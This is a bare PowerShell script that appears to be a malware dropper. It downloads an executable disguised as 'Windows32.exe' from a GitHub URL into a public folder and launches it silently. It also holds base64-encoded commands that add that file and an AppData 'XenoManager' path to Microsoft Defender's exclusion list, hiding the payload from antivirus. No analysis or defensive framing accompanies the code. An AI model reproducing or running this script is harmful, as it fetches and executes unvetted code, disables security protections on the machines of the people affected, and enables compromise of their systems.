Invoke-WebRequest -Uri 'https://github.com/Ilyaskand/e/raw/refs/heads/main/Windows32.exe' -OutFile 'C:\\Users\\Public\\Windows32.exe'
$command = "powershell -EncodedCommand <QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcXFVzZXJzXFxQdWJsaWNcXFdpbmRvd3MzMi5leGUn>"
Start-Process 'C:\\Users\\Public\\Windows32.exe' -ArgumentList '/silent' -NoNewWindow -Wait
$command = "powershell -EncodedCommand <QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcXFVzZXJzXFxJbHlhc1xcQXBwRGF0YVxcUm9hbWluZ1xcWGVub01hbmFnZXJcXFdpbmRvd3MzMi5leGUn>"
